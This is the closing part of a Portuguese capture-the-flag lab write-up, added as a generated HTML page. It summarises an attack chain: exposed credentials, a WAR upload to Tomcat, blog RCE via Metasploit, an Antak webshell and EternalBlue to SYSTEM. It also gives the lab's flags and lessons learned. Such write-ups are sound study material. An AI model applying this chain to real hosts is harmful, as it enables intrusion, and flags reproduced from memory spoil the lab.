+<tr>
+<td style="text-align: left;"><strong>Causa raiz</strong></td>
+<td style="text-align: left;">Credenciais em texto puro no foothold (<code>access-creds.txt</code>) + serviços vulneráveis não corrigidos (blog RCE, IIS com upload exposto, MS17-010)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Cadeia de ataque</strong></td>
+<td style="text-align: left;">RDP → <code>access-creds.txt</code> → WAR no Tomcat (shells-winsvr) <strong>e</strong> blog RCE via Metasploit (shells-nixsvr) → flag <code>B1nD_Shells_r_cool</code> → nmap em 172.16.1.13 → webshell Antak (IIS) → EternalBlue (<code>ms17_010_command</code>) → flag <code>One-H0st-Down!</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Acesso final</strong></td>
+<td style="text-align: left;">SYSTEM em <code>SHELLS-WINBLUE</code> via MS17-010; <code>www-data</code> em <code>shells-nixsvr</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="licoes-aprendidas">💡 Lições Aprendidas</h2>
+<ul>
+<li><strong>O que funcionou:</strong> encadear um arquivo de credenciais exposto no foothold
+  para comprometer dois serviços diferentes (Tomcat Manager e blog PHP); usar
+  pistas do próprio <code>nmap</code> (host chamado "Blue") para direcionar a busca por
+  EternalBlue.</li>
+<li><strong>O que atrasou:</strong> tentar avançar a partir da webshell Antak com o usuário
+  de baixo privilégio <code>iis apppool\defaultapppool</code> — o caminho certo era usar
+  o SMB (MS17-010) para chegar a SYSTEM diretamente.</li>
+<li><strong>Comandos para revisar depois:</strong> <code>msfvenom</code> para gerar payloads WAR;
+  módulos <code>ms17_010_*</code> do Metasploit e a diferença entre eles (<code>eternalblue</code>
+  dá shell completa, <code>command</code> executa apenas um comando via
+  write-what-where).</li>
+<li><strong>Técnicas para estudar melhor:</strong> sempre revisar arquivos de credenciais
+  encontrados logo no acesso inicial — eles frequentemente abrem múltiplos
+  vetores em hosts diferentes na mesma rede interna.</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Voltar para o topo
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado para \u00e1rea de transfer\u00eancia", "clipboard.copy": "Copiar para \u00e1rea de transfer\u00eancia", "search.result.more.one": "mais 1 nesta p\u00e1gina", "search.result.more.other": "# mais nesta p\u00e1gina", "search.result.none": "Nenhum documento encontrado", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Digite para iniciar a busca", "search.result.term.missing": "Ausente", "select.version": "Selecione a vers\u00e3o"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
